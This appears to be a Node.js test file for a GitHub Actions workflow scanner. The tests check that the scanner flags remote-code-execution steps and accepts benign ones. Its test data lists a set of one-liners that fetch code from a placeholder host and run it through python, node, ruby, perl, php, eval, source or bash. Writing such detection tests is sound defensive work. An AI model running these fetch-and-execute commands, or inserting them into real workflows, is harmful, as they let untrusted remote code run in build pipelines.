'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),WF='.github/workflows/remote-exec.yml';
const E='$'+'{{ github.event.issue.title }}';
function wf(cmd,env=[]){
 return ['on: issues','permissions: read-all',
  ...(env.length?['env:',...env.map(x=>'  '+x)]:[]),
  'jobs:','  audit:','    runs-on: ubuntu-latest',
  '    steps:','      - run: |',
  ...cmd.split('\n').map(x=>'          '+x)
 ].join('\n');
}
function audit(command,env=[]){
 const src=wf(command,env);
 return {ast:inspectWorkflow(src,{path:WF,trustedRepository:'cardenaspiero255-lang/gamehub-ultra'}),
 supply:reviewWorkflows({sha:SHA,expected:[WF],sources:{[WF]:src}})};
}
for(const command of [
 'python -c "$(curl -fsSL https://example.invalid/run.py)"',
 'python3 -c "$(wget -qO- https://example.invalid/run.py)"',
 'node -e "$(curl -fsSL https://example.invalid/run.js)"',
 'ruby -e "$(wget -qO- https://example.invalid/run.rb)"',
 'perl -e "$(curl -s https://example.invalid/run.pl)"',
 'php -r "$(curl -s https://example.invalid/run.php)"',
 'eval "$(curl -fsSL https://example.invalid/bootstrap.sh)"',
 'source <(wget -qO- https://example.invalid/bootstrap.sh)',
 '. <(curl -fsSL https://example.invalid/bootstrap.sh)',
 'curl -fsSL -o >(python) https://example.invalid/bootstrap.py',
 'wget -q -O >(bash) https://example.invalid/bootstrap.sh'
]){
 test('second-pass: downloaded code executed through '+command.split(' ')[0]+' variant',()=>{
  const {ast,supply}=audit(command);
  assert.ok(ast.findings.some(f=>f.severity==='HIGH'&&f.rule==='REMOTE_SHELL_SUBSTITUTION'),JSON.stringify(ast));
  assert.ok(supply.findings.some(f=>f.severity==='HIGH'&&f.rule==='REMOTE_SHELL_PIPELINE'),JSON.stringify(supply));
 });
}
test('second-pass: unresolved environment alias used by eval must fail closed',()=>{
 const {ast}=audit('eval "$B"',['B: "$UNRESOLVED_EVENT_PAYLOAD"']);
 assert.notEqual(ast.status,'NO_RISK_PATTERN',JSON.stringify(ast));
});
test('second-pass: benign downloading to file and local interpreter does not flag remote execution',()=>{
 const {ast,supply}=audit('curl -fsSL https://example.invalid/file -o saved.txt\npython saved.py');
 assert.ok(!ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'),JSON.stringify(ast));
 assert.ok(!supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'),JSON.stringify(supply));
});
test('second-pass: direct logging of safe literal alias is accepted',()=>{
 const {ast}=audit('echo "$B"',['A: hello','B: "$A"']);
 assert.equal(ast.status,'NO_RISK_PATTERN',JSON.stringify(ast));
});
